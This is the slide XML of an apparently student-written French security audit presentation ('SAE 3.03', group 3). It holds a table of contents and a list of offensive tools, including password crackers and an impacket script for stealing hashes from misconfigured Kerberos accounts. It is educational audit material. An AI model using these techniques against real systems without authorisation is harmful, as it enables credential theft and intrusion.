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4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9144000"/>
  <p:defaultTextStyle>
    <a:defPPr>
      <a:defRPr lang="fr-F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5" d="100"/>
          <a:sy n="75" d="100"/>
        </p:scale>
        <p:origin x="420" y="438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 /><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tableStyles" Target="tableStyles.xml" /><Relationship Id="rId21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1E2A0F-BB8C-51B9-7D76-5D0BD86689A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C9C37D-C563-3489-5228-3935F28C4E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96BBA23-5220-C159-A39E-3D5421AE093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653934-206A-9D27-BF60-908BB1AF59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B4D2D89-0677-7FD9-77C2-2F14E720C7B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E8BFBC-A79C-73DE-659B-A7A5008D18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82F973-F028-3622-96CC-1D5955F5C6E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FC1906-547D-2252-259F-AA3EAF30BEE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8AF8D16-B778-B39D-3F08-2504DFE157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8E9739-964C-1CBD-DFDD-F0C698AFDA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E3F349-6B50-9EB4-363A-E48CEE2A376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BA6C20-9D5A-A29C-3AE8-12D450C3AD8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E68E19-C594-7B75-27FE-F3FC290BD4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840B3D-8D94-FFA6-10CD-E65E947068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3876643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322489898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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2026005947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D3DEF02-C1D9-4EB5-8C0B-F6F7AC1EBF86}" type="datetimeFigureOut">
              <a:rPr lang="fr-FR"/>
              <a:t>16/01/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="125563977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17666669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9A27C42-3D32-4662-ACAF-2220B1A7891C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499151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832003071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927375945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D3DEF02-C1D9-4EB5-8C0B-F6F7AC1EBF86}" type="datetimeFigureOut">
              <a:rPr lang="fr-FR"/>
              <a:t>16/01/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="798323058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15763413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9A27C42-3D32-4662-ACAF-2220B1A7891C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421750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2138403548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743333701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D3DEF02-C1D9-4EB5-8C0B-F6F7AC1EBF86}" type="datetimeFigureOut">
              <a:rPr lang="fr-FR"/>
              <a:t>16/01/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1767983449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802154341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9A27C42-3D32-4662-ACAF-2220B1A7891C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186523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2032660155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948780716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976256873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D3DEF02-C1D9-4EB5-8C0B-F6F7AC1EBF86}" type="datetimeFigureOut">
              <a:rPr lang="fr-FR"/>
              <a:t>16/01/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1451926463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312879478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9A27C42-3D32-4662-ACAF-2220B1A7891C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442057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901501832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393961727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018344759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2043504317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502433533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D3DEF02-C1D9-4EB5-8C0B-F6F7AC1EBF86}" type="datetimeFigureOut">
              <a:rPr lang="fr-FR"/>
              <a:t>16/01/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1570043887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33958954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9A27C42-3D32-4662-ACAF-2220B1A7891C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3482466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496119050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D3DEF02-C1D9-4EB5-8C0B-F6F7AC1EBF86}" type="datetimeFigureOut">
              <a:rPr lang="fr-FR"/>
              <a:t>16/01/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="829626634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22523628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9A27C42-3D32-4662-ACAF-2220B1A7891C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462962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D3DEF02-C1D9-4EB5-8C0B-F6F7AC1EBF86}" type="datetimeFigureOut">
              <a:rPr lang="fr-FR"/>
              <a:t>16/01/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1969777337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424513906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9A27C42-3D32-4662-ACAF-2220B1A7891C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330136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558665130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07485928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615683023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D3DEF02-C1D9-4EB5-8C0B-F6F7AC1EBF86}" type="datetimeFigureOut">
              <a:rPr lang="fr-FR"/>
              <a:t>16/01/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="269491161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042230406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9A27C42-3D32-4662-ACAF-2220B1A7891C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419075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634568334" name="Espace réservé pour une image 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fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="716649773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457911043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D3DEF02-C1D9-4EB5-8C0B-F6F7AC1EBF86}" type="datetimeFigureOut">
              <a:rPr lang="fr-FR"/>
              <a:t>16/01/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="813134721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76045321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9A27C42-3D32-4662-ACAF-2220B1A7891C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3646251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089499472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263554585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D3DEF02-C1D9-4EB5-8C0B-F6F7AC1EBF86}" type="datetimeFigureOut">
              <a:rPr lang="fr-FR"/>
              <a:t>16/01/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2123636728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0136329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9A27C42-3D32-4662-ACAF-2220B1A7891C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0204574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510892429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545508888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CD3DEF02-C1D9-4EB5-8C0B-F6F7AC1EBF86}" type="datetimeFigureOut">
              <a:rPr lang="fr-FR"/>
              <a:t>16/01/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2065425507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24601207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9A27C42-3D32-4662-ACAF-2220B1A7891C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855152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2084860629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312161341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CD3DEF02-C1D9-4EB5-8C0B-F6F7AC1EBF86}" type="datetimeFigureOut">
              <a:rPr lang="fr-FR"/>
              <a:t>16/01/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12566996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70379173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99A27C42-3D32-4662-ACAF-2220B1A7891C}" type="slidenum">
              <a:rPr lang="fr-FR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media1.svg"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image2.png"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/media2.svg"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image3.png"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/media3.sv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>
            <a:lumMod val="95000"/>
            <a:lumOff val="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942138" name="Graphique 180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822185" y="605060"/>
            <a:ext cx="1596546" cy="649218"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1511366151" name="Groupe 1"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4786639" y="-1210295"/>
            <a:ext cx="8704970" cy="9583185"/>
            <a:chOff x="4786639" y="-1210295"/>
            <a:chExt cx="8704970" cy="9583185"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="174" name="Graphique 173"/>
            <p:cNvPicPr>
              <a:picLocks noChangeAspect="1"/>
            </p:cNvPicPr>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1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/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4921107" y="-451085"/>
              <a:ext cx="8436036" cy="8436036"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="169" name="Graphique 168"/>
            <p:cNvPicPr>
              <a:picLocks noChangeAspect="1"/>
            </p:cNvPicPr>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1"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/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm rot="2594715">
              <a:off x="4786639" y="-1210295"/>
              <a:ext cx="8704970" cy="9583185"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1665712544" name="ZoneTexte 132"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4478342" y="668059"/>
            <a:ext cx="7015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400">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>BRETONNIERE Martin | DAIRIN Côme | DZERAHOVIC-BONNETAUD Sacha LOUISFERT Corentin | POISSON Siméon</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1247727958" name="Groupe 182"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="-723900" y="2121258"/>
            <a:ext cx="11570606" cy="2615481"/>
            <a:chOff x="-723900" y="1859339"/>
            <a:chExt cx="11570606" cy="2615481"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="161" name="Rectangle 160"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="-723900" y="3766933"/>
              <a:ext cx="3829050" cy="707887"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="0077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fr-FR"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="159" name="ZoneTexte 158"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="132752" y="3828489"/>
              <a:ext cx="29171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defRPr/>
              </a:pPr>
              <a:r>
                <a:rPr lang="fr-FR" sz="3600">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                  <a:latin typeface="JetBrains Mono Thin"/>
                  <a:cs typeface="JetBrains Mono Thin"/>
                </a:rPr>
                <a:t>GROUPE 3</a:t>
              </a:r>
              <a:endParaRPr/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="131" name="ZoneTexte 130"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="698497" y="1859339"/>
              <a:ext cx="10148209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defRPr/>
              </a:pPr>
              <a:r>
                <a:rPr lang="fr-FR" sz="5400">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                  <a:latin typeface="JetBrains Mono Bold"/>
                  <a:cs typeface="JetBrains Mono Bold"/>
                </a:rPr>
                <a:t>RAPPORT</a:t>
              </a:r>
              <a:endParaRPr/>
            </a:p>
            <a:p>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:r>
                <a:rPr lang="fr-FR" sz="5400">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                  <a:latin typeface="JetBrains Mono Bold"/>
                  <a:cs typeface="JetBrains Mono Bold"/>
                </a:rPr>
                <a:t>AUDIT DE SÉCURITÉ</a:t>
              </a:r>
              <a:endParaRPr/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1372697613" name="Rectangle 184"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="10476582" y="5882164"/>
            <a:ext cx="2385978" cy="307777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399079510" name="ZoneTexte 183"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="9967765" y="5882164"/>
            <a:ext cx="15257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defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>SAE 3.03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>
            <a:lumMod val="95000"/>
            <a:lumOff val="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1366853" name="Groupe 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4786639" y="-1210295"/>
            <a:ext cx="8704970" cy="9583185"/>
            <a:chOff x="4786639" y="-1210295"/>
            <a:chExt cx="8704970" cy="9583185"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="Graphique 4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>
              <a:off x="4921107" y="-451085"/>
              <a:ext cx="8436036" cy="8436036"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="6" name="Graphique 5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 rot="2594715">
              <a:off x="4786639" y="-1210295"/>
              <a:ext cx="8704970" cy="9583185"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1458551968" name="Sous-titre 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="714599" y="1798634"/>
            <a:ext cx="8791575" cy="4515079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150000"/>
              </a:lnSpc>
              <a:buFontTx/>
              <a:buChar char="-"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="2800">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>Résumé Exécutif</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFontTx/>
              <a:buChar char="-"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="2800">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>Méthodologie</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFontTx/>
              <a:buChar char="-"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="2800">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>Reconnaissance et Énumération</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFontTx/>
              <a:buChar char="-"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="2800">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>Analyse des Vulnérabilités</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFontTx/>
              <a:buChar char="-"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="2800">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>Exploitations</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:buFontTx/>
              <a:buChar char="-"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="fr-FR">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:buFontTx/>
              <a:buChar char="-"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="fr-FR">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="172914589" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="-1480243" y="1206500"/>
            <a:ext cx="5700044" cy="208712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53943611" name="Titre 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="714600" y="823077"/>
            <a:ext cx="8791575" cy="78664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fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Bold"/>
              </a:rPr>
              <a:t>Sommaire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>
            <a:lumMod val="95000"/>
            <a:lumOff val="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23692588" name="Groupe 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4786639" y="-1210295"/>
            <a:ext cx="8704970" cy="9583185"/>
            <a:chOff x="4786639" y="-1210295"/>
            <a:chExt cx="8704970" cy="9583185"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="Graphique 4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>
              <a:off x="4921107" y="-451085"/>
              <a:ext cx="8436036" cy="8436036"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="6" name="Graphique 5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 rot="2594715">
              <a:off x="4786639" y="-1210295"/>
              <a:ext cx="8704970" cy="9583185"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1328579317" name="Sous-titre 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="-444499" y="1080264"/>
            <a:ext cx="12636500" cy="4655373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defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t> - Scan de ports</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>john</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t> - Cassage de mot de passe avec des attaques par dictionnaire</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>nano - Création et édition des différents fichiers </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>text</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t> ou scripts Python</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>2to3 - Outil de conversion de script Python2 vers Python3</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>kerbrute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t> : Outil de découverte d'utilisateur sur un service </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>kerberos</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1500">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="JetBrains Mono Light"/>
              <a:cs typeface="JetBrains Mono Light"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>impacket-GetNPUsers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t> : Avec les bonnes options, permet de détourner les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>hashs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t> de comptes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>kerberos</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t> mal configurés</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>hashcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t> : Crack de hash de mot de passe à partir de listes de mots</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>enum4linux : permet (en partie) de se connecter à un serveur SMB</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="fr-FR" sz="15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>
            <a:lumMod val="95000"/>
            <a:lumOff val="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1977153" name="Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="-1330331" y="577849"/>
            <a:ext cx="8407406" cy="68814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507232589" name="Groupe 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4786639" y="-1210295"/>
            <a:ext cx="8704970" cy="9583185"/>
            <a:chOff x="4786639" y="-1210295"/>
            <a:chExt cx="8704970" cy="9583185"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="7" name="Graphique 6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>
              <a:off x="4921107" y="-451085"/>
              <a:ext cx="8436036" cy="8436036"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="8" name="Graphique 7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 rot="2594715">
              <a:off x="4786639" y="-1210295"/>
